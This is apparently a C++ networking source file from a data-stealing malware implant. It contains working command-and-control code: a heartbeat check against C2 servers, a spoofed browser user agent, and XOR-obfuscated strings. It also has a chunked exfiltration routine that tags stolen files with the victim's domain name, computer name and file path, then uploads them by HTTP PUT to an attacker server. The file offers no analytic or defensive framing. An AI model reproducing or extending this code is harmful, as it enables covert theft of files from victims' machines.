#include "networking.hpp"
#include "HTTPRequest.hpp"

namespace network {

    namespace httpcoms {
        bool HTTPRequestHeartbeat(std::string C2_SERVER) {
            http::Request request{ XOR_LIT("http://") + C2_SERVER + settings::C2_HEARTBEAT_URI };
            http::HeaderFields headers = {
                { "User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0" },
                { "Content-Type", "text/plain" },
                { "Accept", "*/*" }
            };

            try {
                http::Response response = request.send(XOR_LIT("GET"), "", headers, std::chrono::seconds(10));
                std::string httpBody(response.body.begin(), response.body.end());
                XorLogger::LogDebug(XOR_LIT("Heartbeat response: ") + httpBody);
                return httpBody == settings::C2_HEARTBEAT_MAGIC_RESPONSE;
            }
            catch (const http::ResponseError& e) {
                XorLogger::LogError(XOR_LIT("Request failed: ") + std::string{ e.what() });
                return false;
            }
        }

        bool HTTPRequestPUT(const std::string& filePath, const std::vector<unsigned char>& body) {
            http::Request request{ XOR_LIT("http://") + settings::C2_SERVERS[0] + "/" + std::to_string(Hashing::Djb2HashStringA(filePath))};
            http::HeaderField userAgent = { XOR_LIT("User-Agent"), XOR_LIT("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0") };
            http::HeaderField contentType = { XOR_LIT("Content-Type"), XOR_LIT("application/octet-stream") };
            http::HeaderField contentLength = { XOR_LIT("Content-Length"), std::to_string(body.size()) };
            http::HeaderFields headers = {
                contentType,
                contentLength,
            };

            try {
                http::Response response = request.send(XOR_LIT("PUT"), body, headers, std::chrono::seconds(10));
                return true;
            }
            catch (const http::ResponseError& e){
                XorLogger::LogError(XOR_LIT("Request failed: ") + std::string{ e.what() });
                return false;
            }
        }
    }

        bool UploadFilePUTRequest(const std::string& filePath, const std::vector<unsigned char>& fileData, const int& bytesTransferred) {
            int fileDataSize = bytesTransferred;
            int dataSentIndex = 0;
            int chunkSize = MAX_CHUNK_SIZE;

            std::vector<unsigned char> dataHeaderMalwareId = utilities::CreateDataBlobFromString(settings::malware_id);
            std::vector<unsigned char> dataHeaderDomainName = utilities::CreateDataBlobFromString(settings::environment::domainName);
            std::vector<unsigned char> dataHeaderComputerName = utilities::CreateDataBlobFromString(settings::environment::computerName);
            std::vector<unsigned char> dataHeaderFilePath = utilities::CreateDataBlobFromString(filePath);
            
            std::vector<unsigned char> dataHeaders;
            dataHeaders.insert(std::begin(dataHeaders), std::begin(dataHeaderFilePath), std::end(dataHeaderFilePath));
            dataHeaders.insert(std::begin(dataHeaders), std::begin(dataHeaderComputerName), std::end(dataHeaderComputerName));
            dataHeaders.insert(std::begin(dataHeaders), std::begin(dataHeaderDomainName), std::end(dataHeaderDomainName));
            dataHeaders.insert(std::begin(dataHeaders), std::begin(dataHeaderMalwareId), std::end(dataHeaderMalwareId));

            // loop send file chunks
            while (dataSentIndex < fileDataSize) {

                if ((fileDataSize - dataSentIndex) < chunkSize)
                    chunkSize = fileDataSize - dataSentIndex;

                int lastByte = dataSentIndex + chunkSize;

                // slice file data and create blob
                std::vector<unsigned char> dataSlice(fileData.begin() + dataSentIndex, fileData.begin() + lastByte);
                std::vector<unsigned char> fileDataChunk = utilities::CreateDataBlobFromVector(dataSlice);

                // merge metadata with file chunk
                fileDataChunk.insert(std::begin(fileDataChunk), std::begin(dataHeaders), std::end(dataHeaders));

                if (httpcoms::HTTPRequestPUT(filePath, fileDataChunk)) {
                    dataSentIndex += chunkSize;
                }
                else {
                    XorLogger::LogError(XOR_LIT("Error sending bytes"));
                    return false;
                }
            }
            XorLogger::LogDebug(XOR_LIT("Sent file: ") + filePath + "; " + std::to_string(fileDataSize) + XOR_LIT(" bytes"));
            return true;

        }

        namespace utilities {

            void ValidateC2Servers() {
                std::vector<std::string> validC2;
                for (std::string C2 : settings::C2_SERVERS) {
                    if (httpcoms::HTTPRequestHeartbeat(C2)) {
                        validC2.push_back(C2);
                        XorLogger::LogDebug(XOR_LIT("Server alive: ") + C2);
                    }
                    else {
                        XorLogger::LogDebug(XOR_LIT("Server down: ") + C2);
                    }
                }
                settings::C2_SERVERS = validC2;
                return;
            }

            std::vector<unsigned char> intTo4Byte(const uint32_t& length) {
                std::vector<unsigned char> bytes(4);

                bytes[0] = (length >> 24) & 0xFF;
                bytes[1] = (length >> 16) & 0xFF;
                bytes[2] = (length >> 8) & 0xFF;
                bytes[3] = length & 0xFF;

                return bytes;

            }

            std::vector<unsigned char> CreateDataBlobFromString(const std::string& data) {
                std::vector<unsigned char> vectorString(data.begin(), data.end());
                std::vector<unsigned char> vecDataBlob = intTo4Byte((uint32_t)vectorString.size());
                vecDataBlob.insert(std::end(vecDataBlob), std::begin(vectorString), std::end(vectorString));

                return vecDataBlob;
            }

            std::vector<unsigned char> CreateDataBlobFromVector(const std::vector<unsigned char>& data) {
                std::vector<unsigned char> vecDataBlob = intTo4Byte((uint32_t)data.size());
                vecDataBlob.insert(std::end(vecDataBlob), std::begin(data), std::end(data));

                return vecDataBlob;
            }
        }
}